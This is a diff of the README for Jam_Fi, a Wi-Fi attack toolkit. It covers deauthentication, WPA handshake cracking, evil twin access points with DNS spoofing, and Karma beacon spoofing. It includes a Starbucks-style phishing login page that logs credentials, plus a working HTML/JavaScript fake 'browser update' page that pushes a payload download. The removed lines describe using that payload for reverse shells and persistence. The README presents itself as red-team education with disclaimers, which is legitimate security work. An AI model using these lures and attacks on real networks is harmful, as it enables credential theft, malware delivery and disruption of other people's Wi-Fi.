@@ -1,133 +1,164 @@
-# 💜 Jam_Fi – Wi-Fi Chaos Tool  
-by [@ekomsSavior](https://github.com/ekomsSavior)
-
-> Built with love to teach, explore, and cause a little friendly Wi-Fi mischief. 💅
+# Jam_Fi – Wi-Fi Chaos Tool  
+by [@ekomsSavior]
 
 ---
 
 ![image3](https://github.com/user-attachments/assets/960cce0f-7854-4080-b977-b0a02fb34418)
 
-
-## ✨ What is Jam_Fi?
-
-Jam_Fi is a powerful and playful Wi-Fi chaos and red teaming toolkit written in Python for Kali Linux. 
-It's designed for educational and cybersecurity research purposes, helping you learn how attackers exploit wireless networks—and how to defend against them.
-
-Jam_Fi includes tools for:
-
-- Evil Twin Access Points ☠️  
-- Deauthentication Attacks 💥  
-- Handshake Capture & Cracking 🔓  
-- Probe Request & Junk Flooding 📡  
-- Karma Attacks 🧲  
-- MITM HID Injection 💻  
-- Fake Login Phishing with Auto-Logging 📄  
-- and more...
-
-Whether you're a beginner or advanced user, Jam_Fi gives you a hands-on way to experiment and learn in a lab setting.
+# Jam_Fi – Wi-Fi Chaos Toolkit  
+Created by [@ekomsSavior](https://github.com/ekomsSavior)
 
 ---
 
-## 🛠️ Installation
+## What is Jam_Fi?
 
-1. Clone the repo:
+Jam_Fi is an offensive wireless toolkit for Kali Linux, built for red team simulation, network disruption research, and Wi-Fi exploitation education. It includes modules for:
 
+- Deauthentication attacks
+- WPA handshake capture and cracking
+- Probe request and junk frame flooding
+- Evil twin access points with credential logging
+- Karma responder beacon spoofing
+- MITM injection with fake update pages
+- Custom captive portals and payload delivery
+
+All features are designed for local lab use and legal environments only.
+
+---
+
+## Installation
+
+Clone the repository
+
+```bash
 git clone https://github.com/ekomsSavior/Jam_Fi.git
-
 cd Jam_Fi
+```
 
-Make sure you have the following installed:
+Install dependencies
 
+```bash
 sudo apt update
-
 sudo apt install -y aircrack-ng hostapd dnsmasq dnsspoof python3-scapy
+```
 
 Run the tool:
 
+```bash
 sudo python3 jam_fi.py
+```
 
-*To Update periodically:
+To update later:
 
-run from the Jam_fi directory on your machine:
-
+```bash
+cd Jam_Fi
 git pull
+```
 
-----------------------------------------------------------------
+---
 
-## When Jam_fi is running you'll see:
+## Interface Modes: Monitor vs Managed
 
-🔹 1  Scan Clients & APs 🔍
-     → Scans for nearby Wi-Fi networks (Access Points) and the clients connected to them using Scapy.
+Some Jam_Fi modules require **monitor mode**, while others require **managed mode**.
 
-🔹 2  Deauth One Client 💥
-     → Sends a deauthentication attack to disconnect a selected client from their Wi-Fi (uses scapy).
+### Monitor Mode (e.g. wlan0mon)
 
-🔹 3  Deauth ALL Clients + Capture 🔓
-     → Disconnects all clients from known APs and tries to capture WPA/WPA2 handshake packets.
+Required for:
 
-🔹 4  Crack Captured Handshakes 🔓
-     → Tries to crack saved WPA handshakes using Aircrack-ng or Hashcat if installed.
+- Scan Clients & APs  
+- Deauth One Client  
+- Deauth All Clients  
+- Probe Request Spam  
+- Junk Packet Flood  
+- Karma Responder  
+- Chaos Mode  
+- MITM HID Injection
 
-🔹 5  Probe Request Spam 📡
-     → Broadcasts fake SSIDs as if clients are looking for networks, to create wireless noise.
+Enable with:
 
-🔹 6  Junk Packet Flood 💣
-     → Sends randomized packets with fake MAC addresses to flood the airwaves and confuse devices.
+```bash
+sudo airmon-ng start wlan0
+```
 
-🔹 7  Karma Responder 🧲
-     → Responds to any probe request with a beacon frame, tricking devices into connecting.
+Your monitor interface will usually be called `wlan0mon`.
 
-🔹 8  Chaos Mode 💃
-     → Combo mode! Runs Karma Responder, Junk Flood, and Probe Spam all at once.
+---
 
-🔹 9  View Loot 📁
-     → Displays any saved handshakes, captured credentials, or other loot collected in the `loot/` folder.
+### Managed Mode (e.g. wlan0)
 
-🔹 🔟 Evil AP 👿
-     → Launches a fully connectable Evil Twin Access Point with DNS redirection and phishing login page.
+Required for
 
-🔹 11 MITM HID Injection 🧠
-     → Simulates a man-in-the-middle attack by redirecting users to a fake “driver install” page with mock keystroke injection.
+- Evil AP  
+- Captive portal phishing  
+- DNS redirection  
+- Loot viewing  
+- Cracking captured handshakes (optional)
 
-🔹 0  Quit ❌
-     → Exits JamFi and returns to your terminal.
+Switch back with
 
---------------------------------------------------------------------------------------------------------------------     
+```bash
+sudo airmon-ng stop wlan0mon
+sudo systemctl start NetworkManager
+```
 
-## ✨✨✨ Tips & Tricks for Power Users ✨✨✨
-Jam_Fi was made to be playful, powerful, and personal. Here's how you can take your JamFi chaos to the next level:
+---
 
-⚡ Performance Tips
+## Jam_Fi Modules Overview
 
-💻 Optimize Wireless Interface:
+Each module appears in the menu
 
-Use an ALFA AWUS1900 or AWUS036ACH for better packet injection and monitoring.
+```
+1  Scan Clients & APs
+2  Deauth One Client
+3  Deauth All Clients + Capture
+4  Crack Captured Handshakes
+5  Probe Request Spam
+6  Junk Packet Flood
+7  Karma Responder
+8  Chaos Mode
+9  View Loot
+10 Evil AP
+11 MITM HID Injection
+0  Quit
+```
 
-Disable power-saving on your adapter:
+Descriptions
 
-sudo iw dev wlan0 set power_save off
+- **Scan Clients & APs** – Uses Scapy to sniff for access points and associated clients.
+- **Deauth One Client** – Sends deauth packets to a target MAC on a given AP.
+- **Deauth ALL Clients + Capture** – Deauths all known clients while capturing WPA handshakes.
+- **Crack Captured Handshakes** – Runs Aircrack-ng or Hashcat against captured `.pcap` files.
+- **Probe Request Spam** – Broadcasts fake SSIDs based on common public networks.
+- **Junk Packet Flood** – Sends randomized frames to clutter the spectrum.
+- **Karma Responder** – Replies to probe requests with fake beacons.
+- **Chaos Mode** – Combines probe spam, junk flood, and karma attack.
+- **View Loot** – Shows saved handshakes and credentials in `loot/`.
+- **Evil AP** – Launches a rogue access point with credential logging and DNS spoofing.
+- **MITM HID Injection** – Fakes a “driver install” page using beacon spoof + JavaScript.
 
-Switch channels manually with:
+---
 
-iwconfig wlan0 channel 6
-(Replace with the target AP’s channel for better deauth or handshake captures.)
+## The `loot/` Folder
 
-📡 Make Scans Faster:
+JamFi auto-generates files inside `loot/` for phishing and payload delivery:
 
-Edit the scan delay inside jam_fi.py (look for time.sleep() under channel_hopper()).
+| File                | Purpose                                                |
+|---------------------|--------------------------------------------------------|
+| `index.html`        | Default captive portal homepage                        |
+| `login.html`        | Fake login form with credential capture                |
+| `creds.txt`         | Logged usernames and passwords                         |
+| `phish_server.py`   | Simple Python server to collect form submissions       |
+| `injection.html`    | Fake update/payload download page for MITM injection   |
+| `hostapd.conf`      | Config file for starting the evil AP                   |
+| `dnsmasq.conf`      | Handles DHCP and DNS for rogue AP                      |
+| `dnsspoof_hosts`    | Redirects all DNS queries to local attacker IP         |
+| `hotspot-detect.html` | Triggers captive portal on iOS/macOS                 |
 
-Lowering sleep delay to 0.2 or less can speed things up, but may increase CPU usage.
+---
 
---------------------------------------------------------------------------------------------------------------------
+## Evil AP Customization
 
-👿 Evil AP Customization
-🎨 Customize the Captive Portal
-
-Edit this file to make your own fake login page:
-
-loot/login.html
-
-Wanna make it look like Starbucks? Just change the login.html body like this
+Edit `loot/login.html` to create a custom phishing page:
 
 ```html
 <h2>Welcome to Starbucks Free Wi-Fi</h2>
@@ -139,30 +170,23 @@ Wanna make it look like Starbucks? Just change the login.html body like this
 </form>
 ```
 
-You can view your collected credentials in:
+Captured credentials are logged to `loot/creds.txt`.
 
-loot/creds.txt
+---
 
--------------------------------------------------------------------------------------------------------------------
+## MITM Fake Update Injection
 
-🔐 **Advanced Hack: Fake Browser Update + Payload (Optional)**  
-JamFi lets you simulate a fake browser update prompt using pure HTML + JavaScript — no Flipper or Rubber Ducky required!
-
-Once a device connects to your Evil AP, redirect them to a custom update page by editing:  
-`loot/injection.html`
-
-Here’s a simple example:
+You can simulate a fake update prompt with `loot/injection.html`:
 
 ```html
-<!-- loot/injection.html -->
-<h2>🔒 Browser Update Required</h2>
+<h2>Browser Update Required</h2>
 <p>To continue browsing, please install the latest security patch.</p>
 <button onclick="downloadUpdate()">Update Now</button>
 
 <script>
 function downloadUpdate() {
   const a = document.createElement('a');
-  a.href = 'http://10.0.0.1/fake_update.exe';  // Customize your payload here
+  a.href = 'http://10.0.0.1/fake_update.exe';
   a.download = 'update.exe';
   document.body.appendChild(a);
   a.click();
@@ -170,59 +194,24 @@ function downloadUpdate() {
 </script>
 ```
 
-Just place your payload (like `reverse_shell.exe`) in the `loot/` folder and it will auto-download when the user clicks "Update Now".
+Add your own payloads to the `loot/` directory and they will auto-download when the button is clicked.
 
-You now have a simulated Remote Code Execution (RCE) opportunity: if the victim downloads and runs the file, you can trigger reverse shells, backdoors, or persistence depending on your setup.
+---
 
-⚠️ JamFi does not include any malicious payloads — it's up to you to create safe, controlled experiments in your own lab. This is where red teamers, CTF lovers, and students can shine.
+## Disclaimer
 
---------------------------------------------------------------------------------------------------------------------------------
+Jam_Fi is provided for **educational and authorized security research only**.
 
-## 💼 The loot/ Folder
+Do not use this tool against networks or devices you do not own or have permission to test.
 
-This folder contains all the important config and phishing assets used by Evil AP and MITM modes:
+Use responsibly, ethically, and within legal boundaries.
 
-File	Purpose
+---
 
-index.html	The default captive portal or phishing homepage
+## About
 
-login.html	Fake login page that logs entered usernames & passwords
+Jam_Fi is an open-source red team utility developed by [@ekomsSavior](https://github.com/ekomsSavior).
 
-phish_server.py	Hosts the phishing server & saves form data to creds.txt
+If you find it useful, consider starring the repo and contributing responsibly.
 
-creds.txt	Stores submitted login form credentials (auto-created)
-
-hostapd.conf	Used to configure and start the Evil Access Point
-
-dnsmasq.conf	Handles DHCP and DNS for the Evil AP
-
-dnsspoof_hosts	Used by dnsspoof to redirect all DNS to the attacker
-
-hotspot-detect.html	Helps trigger captive portal on iOS/macOS devices
-
-injection.html	Used for MITM HID payload simulation (fake keystroke browser page)
-
-All of these files are auto-generated if missing, so don’t stress if you delete them!
-
-----------------------------------------------------------------------------------
-
-## 🚨 Disclaimer
-
-This tool is for educational and authorized research only.
-
-By using Jam_Fi, you agree that you are responsible for your own actions.
-
-Do not use this tool on networks or devices you don’t have explicit permission to test.
-
-The goal is to educate and empower—not to harm. Use wisely 💜
-
----------------------------------------------------------------------------------------------
-
-## 💜 Built With Love
-
-Jam_Fi is a passion project created by @ekomsSavior xoxoxoox sending hugs to all the homies always ✨✨✨
-
-It’s free, open-source, and meant to make learning cybersecurity hands-on, fun, and inclusive for all.
-
-If you like Jam_Fi, give it a ⭐️ on GitHub and share it with your h4x0r and cybersecurity friends!
 
